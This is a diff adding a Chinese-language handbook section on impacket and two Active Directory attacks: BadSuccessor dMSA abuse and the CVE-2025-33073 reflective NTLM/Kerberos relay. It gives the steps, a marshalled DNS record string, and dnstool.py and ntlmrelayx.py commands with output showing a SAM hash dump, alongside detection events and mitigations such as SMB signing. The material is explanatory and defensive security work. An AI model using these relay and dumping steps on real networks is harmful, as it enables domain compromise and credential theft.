+**补丁之后。** 微软在 `kdcsvc.dll` 里加了校验：单向链接不再被 KDC 认可，必须**双向互为引用**（目标账户也引用该 dMSA，就像一次真实的迁移）才会签发票据。但这并没有给链接属性本身加保护，所以 BadSuccessor 作为**技术**并未消失——在已控目标对象的场景下，它仍可作为"影子凭据"或"DCSync 的替代"来窃取凭据。检测点包括：事件 5137（dMSA 创建）、5136（`msDS-ManagedAccountPrecededByLink` 修改）、2946（为 dMSA 签发 TGT）、4662（对象操作）。
+
+**现成工具。** 上游 `examples/badsuccessor.py` 的 `search` 动作已实现等价的权限侦察（对应 Akamai 的 `Get-BadSuccessorOUPermissions.ps1`），直接用即可。
+
+### 9.2 CVE-2025-33073：反射式中继，一步到 SYSTEM
+
+**背景。** **CVE-2025-33073** 由 RedTeam Pentesting 于 2025 年 1 月发现（Synacktiv 等团队独立复现），2025-05-30 分配编号，随 6 月补丁日修复。微软把它描述为"SMB 客户端提权漏洞"，但正如 Synacktiv 指出的，它实际上是**对任意未强制 SMB 签名机器的"认证后远程命令执行（SYSTEM）"**。它复活了被认为早已死透的**NTLM 反射**（自 MS08-068 起被禁），并把它扩展到了 **Kerberos**。
+
+**原理：CMTI 技巧 + 反射。** 攻击分三步：
+
+1. **注册一条"带泥"的 DNS 记录。** 借助 James Forshaw 的 `CREDENTIAL_TARGET_INFORMATION`（CMTI）思路，SPN 末尾可以拼接一段被序列化的目标信息。于是注册形如 `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` 的记录（`1UWhRCAAAA...` 就是 marshalled 的目标信息），让它指向攻击机。**任意已认证用户默认就有权在域里创建 DNS 记录**（配合 ADIDNS）。
+2. **强制目标认证。** 用 PetitPotam 等强制认证原语，诱导目标机器（以 SYSTEM 身份运行的服务）向上述记录对应的主机发起 SMB 认证。LSASS 在构造认证前会**丢弃**末尾的 marshalled 部分，只留下 `srv1`——于是它"以为"自己是在做本地认证，按本地 NTLM（把 SYSTEM 令牌复制进服务端上下文）或 Kerberos（子密钥 `KERB_LOCAL` 命中）处理。
+3. **回打自身。** 把这次认证中继回目标机器自己的 SMB 服务，即可获得 SYSTEM 会话，进而远程改注册表、转储 SAM。
+
+```text
+# 1. 添加带 CMTI 的 DNS 记录（任意域用户即可）
+#    dnstool.py -u 'CORP\lowpriv' -p <pass> -a add -d <attacker_ip> \
+#        -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA <dc_ip>
+# 2. 强制认证 + 3. 回打自身
+#    ntlmrelayx.py -t smb://SRV1.CORP.LOCAL -smb2support
+[*] Authenticating against smb://SRV1.CORP.LOCAL as / SUCCEED
+[*] Target system bootKey: 0x0c10b250470be78cbe1c92d1b7fe4e91
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:...:::
+```
+
+**前置条件。** 只要求目标**不强制 SMB 签名**——服务端默认只在域控上开启签名，客户端自 Windows 11 24H2 起默认开启，因此大量服务器/客户端仍暴露。**开启 SMB 签名即可阻断此攻击**（即便不打补丁）。
+
+**impacket 的支持。** 0.13.1 为 `ntlmrelayx.py` 增加了与 CVE-2025-33073 相关中继工作流所需的"去除 NTLM sign/seal"路径（`--remove-mic` 相关处理），并紧跟修复了 **CVE-2025-53778**（反射绕过了 HTTPS/WinRM/MSSQL 的通道绑定 CBT）。这些细节直接体现在 `impacket/examples/ntlmrelayx` 的各 relay server 与 SOCKS 插件里。
+
+**补丁与现状。** 微软在 `mrxsmb!SmbCeCreateSrvCall` 中新增了对目标名的检查：一旦发现其中含 marshalled target info 就中止 SMB 连接。但 Synacktiv 在 2026 年进一步指出，该补丁只堵住了 SMB 客户端的 CMTI 技巧，随后又出现了基于 Unicode 归一化 / 自定义端口的新强制认证原语（CVE-2026-24294、CVE-2026-26128 等），**认证反射这一漏洞大类远未终结**。防御上，"域内强制 SMB 签名 + 关闭/审计 ADIDNS 记录创建 + 减少强制认证原语"是最实在的组合拳。
+
+> 小结：两个案例都说明同一件事——**协议链路一旦开放，攻击面就会不断被重新发现**。BadSuccessor 提醒我们关注 KDC 对"迁移关系"的信任假设；CVE-2025-33073 提醒我们"缓解措施（NTLM 反射防护）不等于根治"。而 impacket 之所以能第一时间跟上，恰恰是因为它的模块化实现把每个协议原语都切分得足够细——这也正是本手册花了七章去拆解源码的原因。
 
 引用：
 
